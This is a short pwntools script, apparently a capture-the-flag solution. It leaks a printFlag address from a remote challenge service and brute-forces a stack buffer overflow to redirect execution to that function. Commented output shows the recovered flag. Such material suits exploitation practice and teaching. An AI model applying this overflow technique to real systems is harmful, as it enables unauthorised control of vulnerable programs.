from pwn import *

import sys;
import numpy;
import io;

pwnlib.context.log_level = 'debug'

context.clear(arch='i386')

# We will try overriding memory - not sure what length we need to overflow with to hit the printFlag fn
# But we will need to fill the buffer length 
c = 10
while(True):
  print "Trying with input length %i..."%c
  r = remote('54.89.22.85', 10003)
  r.recvuntil('The address of printFlag 0x', drop=True)

  addr = '0' + r.recvuntil('.', drop=True)
  print "Address is at %s"%addr
  a0 = chr(int(addr[0:2],16))
  a1 = chr(int(addr[2:4],16))
  a2 = chr(int(addr[4:6],16))
  a3 = chr(int(addr[6:8],16))

  r.recvuntil('Enter your name: ', drop=True)
  # Send a number of input characters to fill and overflow the buffer
  r.send(' ' * c)
  # Send the address we want to jump to
  r.send(a0)
  r.send(a1)
  r.send(a2)
  r.send(a3)
  r.sendline()
  r.stream()
  # Increase our length for next iteration
  c += 1

# This will output the following which at some point includes our flag
# Turns out is it at {buffer length} + 4

# Trying with input length 13...
# [+] Opening connection to 54.89.22.85 on port 10003: Done
# Address is at 080484cd
# Your name is:             \x04\x84�
# Hit <Enter> to close.
# Trying with input length 14...
# [+] Opening connection to 54.89.22.85 on port 10003: Done
# Address is at 080484cd
# Your name is:              \x04\x84�
# Hit <Enter> to close.
# The flag is: y7ctf{sm@sh_d4t_st4kr}
# Trying with input length 15...
# [+] Opening connection to 54.89.22.85 on port 10003: Done
# Address is at 080484cd
# Your name is:               \x04\x84�
# Hit <Enter> to close.
# Trying with input length 16...
# [+] Opening connection to 54.89.22.85 on port 10003: Done
